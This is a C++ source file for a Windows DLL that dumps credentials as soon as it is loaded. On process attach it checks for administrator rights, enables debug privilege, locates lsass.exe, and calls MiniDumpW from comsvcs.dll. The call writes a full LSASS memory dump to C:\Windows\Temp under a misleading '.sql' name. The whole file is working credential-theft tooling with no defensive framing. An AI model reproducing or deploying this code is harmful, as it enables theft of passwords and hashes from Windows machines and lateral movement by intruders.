// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#pragma comment( lib, "Dbghelp.lib" )
#define _CRT_SECURE_NO_WARNINGS

typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);

BOOL CheckPrivilege() {
    BOOL state;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
   
    state = AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        SECURITY_LOCAL_SYSTEM_RID, DOMAIN_GROUP_RID_ADMINS,0, 0, 0, 0,
        &AdministratorsGroup);
    if (state)
    {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &state))
        {
            state = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }

    return state;
}

BOOL EnableDebugPrivilege()
{
    
    HANDLE hThis = GetCurrentProcess();
    HANDLE hToken;
    OpenProcessToken(hThis, TOKEN_ADJUST_PRIVILEGES, &hToken);
    LUID luid;
    LookupPrivilegeValue(0, TEXT("seDebugPrivilege"), &luid);
    TOKEN_PRIVILEGES priv;
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL isEnabiled = AdjustTokenPrivileges(hToken, false, &priv, sizeof(priv), 0, 0);
    if (isEnabiled) {
        CloseHandle(hToken);
        CloseHandle(hThis);
        return TRUE;
    }
    return FALSE;
}

DWORD GetLsassPID() {
    DWORD lsassPID = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCWSTR processName = L"";
    //遍历lsass.exe 的PID
    if (Process32First(snapshot, &processEntry)) {
        while (_wcsicmp(processName, L"lsass.exe") != 0) {
            Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            lsassPID = processEntry.th32ProcessID;
        }
    }
    return lsassPID;
}

BOOL CheckFileExists(PWCHAR file) {
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = FindFirstFileEx(file, FindExInfoStandard, &FindFileData,FindExSearchNameMatch, NULL, 0);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    return TRUE;
}
int Dump() {
    WCHAR commandLine[MAX_PATH];
    WCHAR DumpFile[] = L"C:\\Windows\\Temp\\111.sql";
    _MiniDumpW MiniDumpW;
    DWORD lsassPID = 0;

    if (!CheckPrivilege()) {
        return -1;
    }

    if (!EnableDebugPrivilege()) {
        return -1;
    }
   

    if (CheckFileExists(DumpFile)) {
        return 0;
    }

    lsassPID = GetLsassPID();
    MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
    _itow_s(lsassPID, commandLine, 10);
    lstrcatW(commandLine, L" ");
    lstrcatW(commandLine, DumpFile);
    lstrcatW(commandLine, L" full");
    MiniDumpW(0, 0, commandLine);
    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Dump();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

